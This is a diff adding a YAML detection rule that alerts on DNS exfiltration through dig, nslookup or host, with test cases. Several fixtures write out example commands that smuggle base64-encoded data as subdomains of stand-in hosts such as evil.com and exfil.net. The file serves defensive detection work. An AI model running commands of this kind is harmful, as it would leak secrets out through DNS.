@@ -1,0 +1,32 @@
+name: rta_dns_exfiltration
+mode: alert
+eval: |
+  (
+    (e.process_name == "dig" || e.process_name == "nslookup" || e.process_name == "host") &&
+    (
+      re_match(e.process_args, "[A-Za-z0-9+/=]{20,}\\.") ||
+      re_match(e.process_args, "@8\\.8\\.(8\\.8|4\\.4)") ||
+      re_match(e.process_args, "@1\\.1\\.1\\.1")
+    )
+  )
+tests:
+  - cleartext: "dig with base64 encoded subdomain to external DNS"
+    process_name: dig
+    process_args: "dig @8.8.8.8 -p 53 dGhpcyBpcyBhIHNlY3JldCBpbmZvCg==.google.com"
+    should_match: true
+  - cleartext: "nslookup with long encoded subdomain"
+    process_name: nslookup
+    process_args: "nslookup dGhpcyBpcyBhIHNlY3JldCBpbmZvCg==.evil.com 8.8.8.8"
+    should_match: true
+  - cleartext: "dig to cloudflare DNS"
+    process_name: dig
+    process_args: "dig @1.1.1.1 dGhpcyBpcyBhIHRlc3QK.exfil.net"
+    should_match: true
+  - cleartext: "normal dig query"
+    process_name: dig
+    process_args: "dig example.com A"
+    should_match: false
+  - cleartext: "nslookup normal query"
+    process_name: nslookup
+    process_args: "nslookup www.google.com"
+    should_match: false
